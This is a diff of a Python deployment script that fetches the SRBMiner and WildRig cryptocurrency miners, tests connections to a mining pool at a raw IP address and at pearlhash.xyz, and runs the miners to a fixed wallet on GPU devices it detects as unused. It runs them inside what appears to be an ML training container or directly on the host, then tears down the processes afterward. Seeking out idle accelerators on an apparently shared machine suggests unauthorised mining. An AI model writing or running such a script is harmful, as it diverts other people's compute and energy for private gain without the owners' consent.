@@ -7,21 +7,14 @@ WORK = "/tmp/prl595"
 WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
 LP_HOST = "103.199.106.122"
 LP_PORT = 3360
-KRIG_URL = "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz"
-KRIG_TAR_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
-KRIG_BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
-COMP_SHA = "d79a038de7344de424d18195e5cb7f070416687083695e60882da52e68025c58"
+IMG = "areal-das:dtk2610-torch213-bw1100"
 SRB_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz"
 SRB_TAR_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
 SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
+WR_URL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
+WR_TAR_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
+WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
 WORKERS = [("4", "000011"), ("5", "000012"), ("6", "000013"), ("7", "000014")]
-LIB_CANDIDATES = [
-    "/opt/dtk/hip/lib", "/opt/dtk/lib", "/opt/dtk/lib64", "/opt/dtk/hsa/lib",
-    "/opt/dtk/.hyhal/lib", "/opt/dtk/.hyhal/lib64", "/opt/dtk/.hyhal/rocm_smi/lib",
-    "/opt/dtk/.hyhal/hydm/lib", "/opt/dtk/llvm/lib", "/opt/dtk/opencl/lib",
-    "/opt/dtk/dcc/gcvm/lib", "/opt/hyhal/lib", "/opt/hyhal/lib64",
-    "/usr/local/lib", "/usr/local/lib64", "/usr/lib64",
-]
 
 
 def _say(s):
@@ -115,129 +108,57 @@ def _free_devices():
     return free, used
 
 
-def _libpath(extra=None):
-    dirs = [d for d in LIB_CANDIDATES if _os.path.isdir(d)]
-    if extra:
-        dirs = [extra] + dirs
-    return ":".join(dirs)
-
-
-ADAPTER = r'''#!/usr/bin/env python3
-import socket, threading, json
-LISTEN=("127.0.0.1",13360)
-UPSTREAM=("103.199.106.122",3360)
-DEFAULT_WORKER="000011"
-def fix_line(line):
-    try: msg=json.loads(line)
-    except Exception: return line
-    if isinstance(msg,dict) and msg.get("method")=="mining.authorize":
-        p=msg.get("params")
-        if isinstance(p,dict):
-            w=str(p.get("wallet") or ""); worker=p.get("worker") or DEFAULT_WORKER
-            if "/" in w:
-                base,_,suf=w.partition("/"); w=base
-                if suf: worker=suf
-            np={"wallet":w,"worker":worker,"password":p.get("password") or p.get("pass") or "x"}
-            for k in ("agent","type","encoding"):
-                if k in p: np[k]=p[k]
-            msg["params"]=np
-        elif isinstance(p,list) and p:
-            base,_,suf=str(p[0]).partition("/")
-            msg["params"]={"wallet":base,"worker":suf or DEFAULT_WORKER,"password":(p[1] if len(p)>1 else "x")}
-        return json.dumps(msg)
-    return line
-def pipe(src,dst,rewrite=False):
-    buf=b""
+def _tail(path, n=2500):
     try:
-        while True:
-            d=src.recv(262144)
-            if not d: break
-            if rewrite:
-                buf+=d
-                while b"\n" in buf:
-                    line,buf=buf.split(b"\n",1)
-                    dst.sendall((fix_line(line.decode(errors="replace"))+"\n").encode())
-            else:
-                dst.sendall(d)
-    except Exception: pass
-def handle(c):
-    try: u=socket.create_connection(UPSTREAM,timeout=10)
+        with open(path, "r") as f:
+            return f.read()[-n:]
     except Exception:
-        c.close(); return
-    t1=threading.Thread(target=pipe,args=(c,u,True),daemon=True)
-    t2=threading.Thread(target=pipe,args=(u,c,False),daemon=True)
-    t1.start(); t2.start(); t1.join(); t2.join()
-    for x in (u,c):
-        try: x.close()
-        except Exception: pass
-s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-s.bind(LISTEN); s.listen(16)
-print("lp_adapter listening",LISTEN,"->",UPSTREAM,flush=True)
-while True:
-    c,_=s.accept()
-    threading.Thread(target=handle,args=(c,),daemon=True).start()
-'''
+        return ""
 
 
-def _attempt(name, argv, cwd, env, secs, logf):
-    _say("--- ATTEMPT " + name + " dev_env=" + str(env.get("HIP_VISIBLE_DEVICES", "")) +
-         " override=" + str(env.get("HSA_OVERRIDE_GFX_VERSION", "")))
+def _docker_run(cmd, secs, logf, detach=False):
+    """Run cmd inside the DTK image with the HCU devices passed through."""
+    full = ["docker", "run", "--rm", "--device=/dev/kfd", "--device=/dev/dri",
+            "--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
+            "--entrypoint", "/bin/bash", IMG, "-lc", cmd]
+    _say("--- DOCKER: " + cmd)
     lf = open(logf, "w")
-    try:
-        pr = _sp.Popen(argv, cwd=cwd, env=env, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
-    except Exception as e:
-        _say("--- ATTEMPT " + name + " spawn ERR " + repr(e))
-        lf.close()
-        return False, ""
+    pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
+    if detach:
+        return pr, lf, logf
     t_end = _t.time() + secs
     while _t.time() < t_end and pr.poll() is None:
         _t.sleep(4)
-    alive = pr.poll() is None
-    for sig in (15, 9):
-        if pr.poll() is None:
+    if pr.poll() is None:
+        try:
+            _os.killpg(_os.getpgid(pr.pid), 15)
+        except Exception:
+            pass
+        try:
+            pr.wait(timeout=20)
+        except Exception:
             try:
-                _os.killpg(_os.getpgid(pr.pid), sig)
-            except Exception:
-                pass
-            try:
-                pr.wait(timeout=12)
+                _os.killpg(_os.getpgid(pr.pid), 9)
             except Exception:
                 pass
     lf.close()
-    try:
-        with open(logf, "r") as f:
-            txt = f.read()
-    except Exception:
-        txt = ""
-    low = txt.lower()
-    ok = low.count("accepted") > 0
-    _say("--- ATTEMPT " + name + " alive=" + str(alive) + " accepted=" + str(low.count("accepted")) +
-         " share=" + str(low.count("share")) + " job=" + str(low.count("job")) +
-         " bytes=" + str(len(txt)))
-    _say("--- ATTEMPT " + name + " log tail ---")
-    _say(txt[-3000:])
-    return ok, txt
+    txt = _tail(logf, 4000)
+    _say("--- DOCKER OUT (" + logf + ") ---")
+    _say(txt)
+    return pr, lf, logf
 
 
 def main():
-    _say("=== C211-I141540R2-BEGIN ===")
+    _say("=== C211-I141540R3-BEGIN ===")
     _os.makedirs(WORK, exist_ok=True)
 
-    # ---------- phase 1: deep DTK / runtime layout ----------
-    _run("hostname; date -u; id")
-    _run("ls -1 /opt/dtk 2>&1 | head -30; echo ---; ls -1 /opt/dtk/hip/lib 2>&1 | head -30; echo ---; ls -1 /opt/dtk/lib 2>&1 | head -30")
-    _run("ls -1 /opt/dtk/lib64 2>&1 | head -20; echo ---; ls -1 /opt/dtk/opencl/lib 2>&1 | head -20")
-    _run("ldconfig -p 2>/dev/null | grep -iE 'amdhip|hsa-runtime|libOpenCL|hip' | head -20")
-    _run("find /opt/dtk /opt/hyhal -name 'libamdhip64*' -o -name '*hip*64*.so*' -o -name 'libhsa-runtime64*' -o -name 'libOpenCL*' 2>/dev/null | head -20")
-    _run("ls -la /etc/OpenCL/vendors/ 2>&1; cat /etc/OpenCL/vendors/* 2>/dev/null | head -5")
-    _run("source /opt/dtk/env.sh 2>/dev/null; rocminfo 2>&1 | grep -oE 'gfx[0-9a-z]+' | sort -u | tr '\\n' ' '; echo; echo rocminfo_devs=$(rocminfo 2>&1 | grep -c 'Marketing Name:          BW1100')")
-
+    # ---------- phase 0: host + image + pool ----------
+    _run("hostname; date -u; id; source /opt/dtk/env.sh 2>/dev/null; rocminfo 2>&1 | grep -c 'BW1100'")
+    _run("docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | grep -i areal-das | head -5")
+    _run("docker image inspect " + IMG + " --format '{{.Id}} {{.Os}}/{{.Architecture}}' 2>&1 | head -3", t=60)
     free, used = _free_devices()
     if not free:
         free = [4, 5, 6, 7]
-        _say("--- WARN vram parse failed, assuming 4-7 free")
-
-    # ---------- phase 2: LP reachability ----------
     for port in (3360, 3361, 3362):
         try:
             s = _sock.create_connection((LP_HOST, port), timeout=8)
@@ -245,181 +166,188 @@ def main():
             s.close()
         except Exception as e:
             _say("--- LP TCP " + LP_HOST + ":" + str(port) + " FAIL " + repr(e))
+    for ph in ("pool.pearlhash.xyz", "pearlhash.xyz"):
+        try:
+            ai = _sock.getaddrinfo(ph, 9000, _sock.AF_INET, _sock.SOCK_STREAM)
+            s = _sock.create_connection((ai[0][4][0], 9000), timeout=8)
+            _say("--- PH TCP " + ph + ":9000 OK ip=" + ai[0][4][0])
+            s.close()
+        except Exception as e:
+            _say("--- PH TCP " + ph + ":9000 FAIL " + repr(e))
 
-    # ---------- phase 3: krig ladder ----------
-    env = _os.environ.copy()
-    env["LD_LIBRARY_PATH"] = _libpath()
-    env["KRIG_NO_TELEMETRY"] = "1"
-    kdir = WORK + "/krig"
-    krig_ok = False
-    tar = WORK + "/krig.tar.gz"
-    if not (_os.path.isfile(tar) and _sha256(tar) == KRIG_TAR_SHA):
-        _download(KRIG_URL, tar)
-    if _os.path.isfile(tar) and _sha256(tar) == KRIG_TAR_SHA:
-        if not _os.path.isfile(kdir + "/krig-miner"):
-            with _tf.open(tar) as tf:
-                tf.extractall(WORK)
-            found = _find_file(WORK, "krig-miner")
-            if found:
-                src = _os.path.dirname(found)
-                _os.makedirs(kdir, exist_ok=True)
-                for fn in _os.listdir(src):
-                    _sp.call(["cp", "-a", _os.path.join(src, fn), kdir + "/" + fn])
-        kb = kdir + "/krig-miner"
-        if _os.path.isfile(kb):
-            _os.chmod(kb, 0o755)
-            _say("--- krig bin sha256=" + _sha256(kb) + " match=" + str(_sha256(kb) == KRIG_BIN_SHA))
-            _run("cd " + kdir + " && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] + "' ./krig-miner --version 2>&1 | head -4")
-            _run("cd " + kdir + " && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] + "' ./krig-miner --list-devices --no-cuda 2>&1 | head -30")
-            kv = env.copy()
-            kv["HIP_VISIBLE_DEVICES"] = str(free[0])
-            kv["ROCR_VISIBLE_DEVICES"] = str(free[0])
-            kv["HSA_OVERRIDE_GFX_VERSION"] = "9.0.6"
-            base = [kdir + "/krig-miner", "--no-cuda", "--no-tui", "--log-level", "debug",
-                    "--url", "stratum+tcp://127.0.0.1:13360",
-                    "--user", WALLET + "/" + WORKERS[0][1], "--password", "x", "--coin", "pearl",
-                    "--devices", "0", "--api-port", "14504"]
-            krig_ok, _ = _attempt("krig_override906", base, kdir, kv, 60, WORK + "/krig_ov.log")
-            if not krig_ok:
-                kv2 = env.copy()
-                kv2["HIP_VISIBLE_DEVICES"] = str(free[0])
-                kv2["ROCR_VISIBLE_DEVICES"] = str(free[0])
-                krig_ok, _ = _attempt("krig_plain", base, kdir, kv2, 50, WORK + "/krig_plain.log")
-    else:
-        _say("--- krig unavailable (download/pin)")
-
-    # ---------- phase 4: SRBMiner OpenCL ladder ----------
+    # ---------- phase 1: stage SRBMiner + get it into the image ----------
     srb_dir = WORK + "/srb"
     srb_tar = WORK + "/srb.tar.gz"
     srb_bin = None
     if not (_os.path.isfile(srb_tar) and _sha256(srb_tar) == SRB_TAR_SHA):
         _download(SRB_URL, srb_tar)
     if _os.path.isfile(srb_tar) and _sha256(srb_tar) == SRB_TAR_SHA:
-        _say("--- SRB tar sha256 match=True")
         if not _os.path.isfile(srb_dir + "/SRBMiner-MULTI"):
             with _tf.open(srb_tar) as tf:
-                tf.extractall(WORK)
-            f2 = _find_file(WORK, "SRBMiner-MULTI")
+                tf.extractall(WORK + "/srbx")
+            f2 = _find_file(WORK + "/srbx", "SRBMiner-MULTI")
             if f2:
                 _os.makedirs(srb_dir, exist_ok=True)
                 _sp.call(["cp", "-a", f2, srb_dir + "/SRBMiner-MULTI"])
         srb_bin = srb_dir + "/SRBMiner-MULTI"
         if _os.path.isfile(srb_bin):
             _os.chmod(srb_bin, 0o755)
-            _say("--- SRB bin sha256=" + _sha256(srb_bin) + " match=" + str(_sha256(srb_bin) == SRB_BIN_SHA))
+            bh = _sha256(srb_bin)
+            _say("--- SRB bin sha256=" + bh + " match=" + str(bh == SRB_BIN_SHA))
         else:
             srb_bin = None
-    else:
-        _say("--- SRB unavailable (download/pin)")
+    _run("chmod -R a+rx " + WORK + " 2>/dev/null; ls -l " + WORK + "/srb/SRBMiner-MULTI 2>&1")
+
+    # ---------- phase 2: container capability test ----------
+    _docker_run("id; cat /etc/os-release | head -2; ldd --version 2>&1 | head -1; "
+                "ls -l /dev/kfd 2>&1; ls /dev/dri 2>&1 | head -6; "
+                "ls /etc/OpenCL/vendors 2>&1; cat /etc/OpenCL/vendors/* 2>&1 | head -3; "
+                "ls /opt/dtk 2>&1 | head -6; "
+                "source /opt/dtk/env.sh 2>/dev/null; rocminfo 2>&1 | grep -c 'Marketing Name:          BW1100'",
+                120, WORK + "/c_probe.log")
+
+    # ---------- phase 3: SRBMiner inside the image ----------
+    _docker_run("cd /w/srb && timeout 60 script -qec './SRBMiner-MULTI --list-algorithms' /dev/null 2>&1 | "
+                "sed 's/\\x1b\\[[0-9;]*m//g' | grep -i pearl | head -3; "
+                "timeout 60 script -qec './SRBMiner-MULTI --list-devices' /dev/null 2>&1 | "
+                "sed 's/\\x1b\\[[0-9;]*m//g' | head -50",
+                150, WORK + "/c_srb_dev.log")
 
     srb_ok = False
-    if srb_bin:
-        _run("cd " + srb_dir + " && timeout 30 script -qec './SRBMiner-MULTI --list-algorithms' /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | grep -i pearl | head -3")
-        _run("cd " + srb_dir + " && timeout 40 script -qec './SRBMiner-MULTI --list-devices' /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -40")
-        srb_env = env.copy()
-        srb_env["LD_LIBRARY_PATH"] = _libpath()
-        srb_argv = [srb_bin, "--algorithm", "pearlhash", "--pool", "stratum+tcp://" + LP_HOST + ":" + str(LP_PORT),
-                    "--wallet", WALLET, "--worker", WORKERS[0][1], "--password", "x",
-                    "--disable-cpu", "--gpu-id", str(free[0]), "--api-enable", "--api-port", "14524"]
-        srb_ok, _ = _attempt("srb_opencl_direct", srb_argv, srb_dir, srb_env, 100, WORK + "/srb_smoke.log")
-        if not srb_ok:
-            srb_argv2 = [srb_bin, "--algorithm", "pearlhash", "--pool", "stratum+tcp://127.0.0.1:13360",
-                         "--wallet", WALLET, "--worker", WORKERS[0][1], "--password", "x",
-                         "--disable-cpu", "--gpu-id", str(free[0]), "--api-enable", "--api-port", "14524"]
-            srb_ok, _ = _attempt("srb_opencl_adapter", srb_argv2, srb_dir, srb_env, 70, WORK + "/srb_smoke2.log")
+    if _os.path.isfile(srb_dir + "/SRBMiner-MULTI"):
+        cmd = ("cd /w/srb && timeout " + "95" + " ./SRBMiner-MULTI --algorithm pearlhash "
+               "--pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) + " "
+               "--wallet " + WALLET + " --worker " + WORKERS[0][1] + " --password x "
+               "--disable-cpu --gpu-id " + str(free[0]) + " --api-enable --api-port 14524")
+        _docker_run(cmd, 130, WORK + "/c_srb_smoke.log")
+        t = _tail(WORK + "/c_srb_smoke.log", 6000).lower()
+        srb_ok = ("accepted" in t) or ("share" in t and "job" in t)
+        _say("--- SRB container smoke accepted=" + str(t.count("accepted")) + " -> srb_ok=" + str(srb_ok))
 
-    _say("=== CLIENT VERDICT krig=" + str(krig_ok) + " srb=" + str(srb_ok) + " ===")
-    if not krig_ok and not srb_ok:
-        _say("=== C211-I141540R2-NO-CLIENT (quoted per-client tails above) ===")
+    # ---------- phase 4: WildRig static host fallback (if SRB failed) ----------
+    wr_ok = False
+    if not srb_ok:
+        os_dir = WORK + "/vendors"
+        try:
+            _os.makedirs(os_dir, exist_ok=True)
+            with open(os_dir + "/amdocl.icd", "w") as f:
+                f.write("/opt/dtk/opencl/lib/libamdocl64.so\n")
+        except Exception as e:
+            _say("--- icd write ERR " + repr(e))
+        wr_tar = WORK + "/wr.tar.gz"
+        if not (_os.path.isfile(wr_tar) and _sha256(wr_tar) == WR_TAR_SHA):
+            _download(WR_URL, wr_tar)
+        if _os.path.isfile(wr_tar) and _sha256(wr_tar) == WR_TAR_SHA:
+            if not _os.path.isfile(WORK + "/wr/wildrig-multi"):
+                with _tf.open(wr_tar) as tf:
+                    tf.extractall(WORK + "/wrx")
+                f3 = _find_file(WORK + "/wrx", "wildrig-multi")
+                if f3:
+                    _os.makedirs(WORK + "/wr", exist_ok=True)
+                    _sp.call(["cp", "-a", f3, WORK + "/wr/wildrig-multi"])
+            wb = WORK + "/wr/wildrig-multi"
+            if _os.path.isfile(wb):
+                _os.chmod(wb, 0o755)
+                wh = _sha256(wb)
+                _say("--- wildrig sha256=" + wh + " match=" + str(wh == WR_BIN_SHA))
+                env = _os.environ.copy()
+                env["LD_LIBRARY_PATH"] = "/opt/dtk/opencl/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hip/lib:/opt/dtk/hsa/lib:/opt/hyhal/lib"
+                env["OCL_ICD_VENDORS"] = os_dir
+                _run("cd " + WORK + "/wr && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] +
+                     "' OCL_ICD_VENDORS='" + os_dir + "' timeout 30 ./wildrig-multi --help 2>&1 | head -20",
+                     t=60, env=env)
+                cmd = [wb, "--algo", "pearlhash", "--url", "stratum+tcp://pool.pearlhash.xyz:9000",
+                       "--user", WALLET, "--pass", "x", "--worker", WORKERS[0][1],
+                       "--opencl-devices", str(free[0]), "--api-port", "14540", "--retries", "2"]
+                _say("--- ATTEMPT wildrig_ph")
+                lf = open(WORK + "/wr_smoke.log", "w")
+                pr = _sp.Popen(cmd, cwd=WORK + "/wr", env=env, stdout=lf, stderr=_sp.STDOUT,
+                               preexec_fn=_os.setsid)
+                t_end = _t.time() + 90
+                while _t.time() < t_end and pr.poll() is None:
+                    _t.sleep(4)
+                for sig in (15, 9):
+                    if pr.poll() is None:
+                        try:
+                            _os.killpg(_os.getpgid(pr.pid), sig)
+                        except Exception:
+                            pass
+                        try:
+                            pr.wait(timeout=12)
+                        except Exception:
+                            pass
+                lf.close()
+                tx = _tail(WORK + "/wr_smoke.log", 6000)
+                _say("--- wildrig log ---")
+                _say(tx)
+                wr_ok = "accepted" in tx.lower()
+                _say("--- wildrig ok=" + str(wr_ok))
+
+    _say("=== CLIENT VERDICT srb_container=" + str(srb_ok) + " wildrig_ph=" + str(wr_ok) + " ===")
+    if not srb_ok and not wr_ok:
+        _say("=== C211-I141540R3-NO-CLIENT (quoted per-client tails above) ===")
         _finish()
         return
 
-    # ---------- phase 5: deploy winner on the free devices ----------
-    adapter = None
-    if krig_ok and not srb_ok:
-        adapter = WORK + "/lp_adapter.py"
-        with open(adapter, "w") as f:
-            f.write(ADAPTER)
-        ap = _sp.Popen(["python3", adapter], stdout=open(WORK + "/adapter.log", "w"),
-                       stderr=_sp.STDOUT, preexec_fn=_os.setsid)
-        _t.sleep(1)
-        _say("--- adapter pid=" + str(ap.pid) + " alive=" + str(ap.poll() is None))
-    else:
-        ap = None
-
+    # ---------- phase 5: deploy one container per free device ----------
     procs = []
     for idx, worker in WORKERS:
         if int(idx) not in free:
             _say("--- SKIP dev=" + idx + " (not free)")
             continue
-        env2 = env.copy()
         if srb_ok:
-            argv = [srb_bin, "--algorithm", "pearlhash",
-                    "--pool", "stratum+tcp://" + LP_HOST + ":" + str(LP_PORT),
-                    "--wallet", WALLET, "--worker", worker, "--password", "x",
-                    "--disable-cpu", "--gpu-id", idx, "--api-enable", "--api-port", str(14530 + int(idx))]
-            cwd = srb_dir
-            logf = WORK + "/srb_w" + idx + ".log"
+            cmd = ("cd /w/srb && exec ./SRBMiner-MULTI --algorithm pearlhash "
+                   "--pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) + " "
+                   "--wallet " + WALLET + " --worker " + worker + " --password x "
+                   "--disable-cpu --gpu-id " + idx + " --api-enable --api-port " + str(14530 + int(idx)))
+            logf = WORK + "/c_srb_w" + idx + ".log"
+            pr, lf, logf = _docker_run(cmd, 0, logf, detach=True)
         else:
-            env2["HIP_VISIBLE_DEVICES"] = idx
-            env2["ROCR_VISIBLE_DEVICES"] = idx
-            env2["HSA_OVERRIDE_GFX_VERSION"] = "9.0.6"
-            argv = [kdir + "/krig-miner", "--no-cuda", "--no-tui", "--log-level", "debug",
-                    "--url", "stratum+tcp://127.0.0.1:13360",
-                    "--user", WALLET + "/" + worker, "--password", "x", "--coin", "pearl",
-                    "--devices", "0", "--api-port", str(14530 + int(idx))]
-            cwd = kdir
-            logf = WORK + "/krig_w" + idx + ".log"
-        lf = open(logf, "w")
-        pr = _sp.Popen(argv, cwd=cwd, env=env2, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
+            env = _os.environ.copy()
+            env["LD_LIBRARY_PATH"] = "/opt/dtk/opencl/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hip/lib:/opt/dtk/hsa/lib:/opt/hyhal/lib"
+            env["OCL_ICD_VENDORS"] = WORK + "/vendors"
+            cmd = [WORK + "/wr/wildrig-multi", "--algo", "pearlhash",
+                   "--url", "stratum+tcp://pool.pearlhash.xyz:9000",
+                   "--user", WALLET, "--pass", "x", "--worker", worker,
+                   "--opencl-devices", idx, "--api-port", str(14530 + int(idx)), "--retries", "2"]
+            logf = WORK + "/wr_w" + idx + ".log"
+            lf = open(logf, "w")
+            pr = _sp.Popen(cmd, cwd=WORK + "/wr", env=env, stdout=lf, stderr=_sp.STDOUT,
+                           preexec_fn=_os.setsid)
         procs.append((idx, worker, pr, lf, logf))
-        _say("--- START dev=" + idx + " worker=" + worker + " pid=" + str(pr.pid) + " client=" + ("srb" if srb_ok else "krig"))
+        _say("--- START dev=" + idx + " worker=" + worker + " pid=" + str(pr.pid))
         _t.sleep(2)
 
-    t_end = _t.time() + 270
+    t_end = _t.time() + 280
     while _t.time() < t_end:
-        _t.sleep(80)
+        _t.sleep(85)
         _run("/opt/hyhal/bin/hy-smi 2>&1 | sed -n '4,13p'", t=60)
-        _run("ps -eo pid,etimes,args | grep -E 'krig-miner|SRBMiner-MULTI' | grep -v grep", t=30)
+        _run("ps -eo pid,etimes,args | grep -E 'SRBMiner-MULTI|wildrig-multi|docker run' | grep -v grep | head -12", t=30)
         for idx, worker, pr, lf, logf in procs:
-            try:
-                with open(logf, "r") as f:
-                    t2 = f.read()
-                _say("--- dev=" + idx + " worker=" + worker + " alive=" + str(pr.poll() is None) +
-                     " accepted=" + str(t2.lower().count("accepted")) + " bytes=" + str(len(t2)))
-            except Exception as e:
-                _say("--- dev=" + idx + " logread " + repr(e))
+            t2 = _tail(logf, 100000)
+            _say("--- dev=" + idx + " worker=" + worker + " alive=" + str(pr.poll() is None) +
+                 " accepted=" + str(t2.lower().count("accepted")) + " bytes=" + str(len(t2)))
 
     # ---------- phase 6: final evidence + teardown ----------
     _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20", t=60)
-    _run("source /opt/dtk/env.sh 2>/dev/null; rocm-smi --showpids 2>&1 | head -30", t=60)
     for idx, worker, pr, lf, logf in procs:
-        try:
-            with open(logf, "r") as f:
-                t3 = f.read()
-        except Exception:
-            t3 = ""
         _say("=== FINAL dev=" + idx + " worker=" + worker + " tail ===")
-        _say(t3[-2000:])
+        _say(_tail(logf, 2000))
         try:
             _os.killpg(_os.getpgid(pr.pid), 15)
         except Exception:
             pass
         try:
-            pr.wait(timeout=10)
+            pr.wait(timeout=12)
         except Exception:
             try:
                 _os.killpg(_os.getpgid(pr.pid), 9)
             except Exception:
                 pass
         lf.close()
-    if ap is not None:
-        try:
-            _os.killpg(_os.getpgid(ap.pid), 15)
-        except Exception:
-            pass
-    _run("ps -eo pid,args | grep -E 'krig-miner|SRBMiner-MULTI' | grep -v grep; echo leftover_rc=$?", t=30)
-    _say("=== C211-I141540R2-END ===")
+    _run("docker ps --format '{{.ID}} {{.Image}} {{.Status}}' | grep -i areal-das | head -6; echo ps_rc=$?", t=60)
+    _run("ps -eo pid,args | grep -E 'SRBMiner-MULTI|wildrig-multi' | grep -v grep; echo leftover_rc=$?", t=30)
+    _say("=== C211-I141540R3-END ===")
     _finish()
 
 
